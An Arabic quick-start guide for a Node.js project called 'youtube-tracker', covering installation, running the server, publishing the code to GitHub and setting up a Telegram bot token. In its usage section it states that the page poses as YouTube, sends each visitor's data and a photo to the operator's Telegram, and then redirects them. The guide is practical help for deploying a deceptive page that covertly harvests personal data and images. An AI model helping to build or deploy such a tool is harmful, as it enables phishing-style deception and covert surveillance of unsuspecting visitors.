# 🚀 دليل البدء السريع

## خطوة 1️⃣: تثبيت البرامج

### Windows
1. حمّل Node.js من: https://nodejs.org
2. اختر الإصدار LTS (الأحمر)
3. اضغط Install وتابع الخطوات

### Mac/Linux
```bash
# Mac
brew install node

# Linux (Ubuntu/Debian)
sudo apt-get install nodejs npm
```

---

## خطوة 2️⃣: إعداد المشروع

### انسخ هذه الأوامر بالتسلسل:

```bash
# 1. اذهب إلى مجلد المشروع
cd /path/to/youtube-tracker

# 2. ثبت البرامج المطلوبة
npm install

# 3. انسخ ملف .env وعدّله (اختياري)
# تأكد من أن .env موجود بـ التوكن الصحيح
```

---

## خطوة 3️⃣: تشغيل السيرفر

```bash
npm start
```

**ستظهر هذه الرسالة:**
```
🚀 السيرفر يعمل على: http://localhost:3000
✅ API Endpoint: http://localhost:3000/api/send-data
🧪 اختبر: http://localhost:3000/api/test
```

---

## خطوة 4️⃣: الاختبار

افتح متصفحك واذهب إلى:
```
http://localhost:3000
```

يجب أن تظهر صفحة YouTube مزيفة مع شريط تحميل.

---

## خطوة 5️⃣: الرفع على GitHub

### أولاً: إنشاء حساب GitHub
1. اذهب إلى https://github.com
2. اضغط Sign up وأنشئ حساباً

### ثانياً: إنشاء مستودع جديد
1. بعد تسجيل الدخول، اضغط "+" → "New repository"
2. سمّه: `youtube-tracker`
3. اختر "Public"
4. اضغط "Create repository"

### ثالثاً: رفع الملفات

افتح Terminal/Command Prompt وانسخ هذه الأوامر:

```bash
# 1. تهيئة Git (مرة واحدة فقط)
git init

# 2. إضافة الملفات
git add .

# 3. حفظ التغييرات
git commit -m "YouTube Tracker Bot - Initial Upload"

# 4. إضافة رابط GitHub (غيّر yourusername)
git remote add origin https://github.com/yourusername/youtube-tracker.git

# 5. الرفع
git branch -M main
git push -u origin main
```

### ستظهر رسالة:
```
✅ Enumerating objects
✅ Counting objects
✅ Compressing objects
...
✅ Everything up-to-date
```

---

## ✅ التحقق من GitHub

1. افتح حسابك على GitHub
2. اذهب إلى مستودعك `youtube-tracker`
3. تحقق من:
   - ✅ `index.html` موجود
   - ✅ `server.js` موجود
   - ✅ `package.json` موجود
   - ❌ `.env` **لا يجب أن يظهر** (مخفي بـ .gitignore)
   - ❌ `node_modules` **لا يجب أن يظهر**

---

## 🎯 لو حصلت مشكلة؟

### المشكلة: `npm: command not found`
**الحل:** إعد تشغيل الكمبيوتر بعد تثبيت Node.js

### المشكلة: `Port 3000 already in use`
**الحل:** غيّر الـ PORT في ملف .env
```
PORT=3001
```

### المشكلة: `.env` ظهر على GitHub بالخطأ
**الحل:**
```bash
git rm --cached .env
git commit -m "Remove .env"
git push
```

### المشكلة: لا أستطيع رفع الملفات
**الحل 1:** تأكد من تثبيت Git:
```bash
git --version
```
إذا لم يظهر شيء، اذهب إلى https://git-scm.com وثبّت Git

**الحل 2:** تحقق من اتصالك بالإنترنت

---

## 📱 استخدام الموقع

1. افتح: http://localhost:3000
2. الصفحة ستظهر وكأنها YouTube
3. ستظهر بيانات الزائر + الصورة في Telegram
4. بعد ثانيتين ستنقل للرابط المحدد

---

## 🔐 التوكن والـ Chat ID

أين تجدها؟

### التوكن:
1. افتح Telegram وابحث عن `@BotFather`
2. اضغط `/mybots`
3. اختر البوت الخاص بك
4. اضغط "API Token"
5. انسخ الرقم وضعه في `.env`

### Chat ID:
1. افتح Telegram وابحث عن `@userinfobot`
2. اضغط Start
3. ستظهر معرفتك (Chat ID)
4. انسخها وضعها في `.env`

---

## 💚 نصائح ذهبية

✅ **احفظ نسخة من `.env`** في مكان آمن (لا تشاركها!)

✅ **إذا نسيت التوكن**:
- اذهب لـ BotFather
- اضغط `/regenerate_token`
- استبدل القديم بالجديد

✅ **لا تشارك `.env` مع أحد** - فيه بيانات حساسة!

✅ **كل ما تعدّل الكود**:
```bash
git add .
git commit -m "تعديل..."
git push
```

---

## 🎓 التعليم التالي

بعد ما تشتغل الأساسيات:
1. جرّب Heroku أو Railway للاستضافة المجانية
2. أضف اختبارات أمان
3. أضف قاعدة بيانات
4. أضف Dashboard لعرض البيانات

---

**الآن أنت جاهز! قدماً نحو النجاح! 🚀**
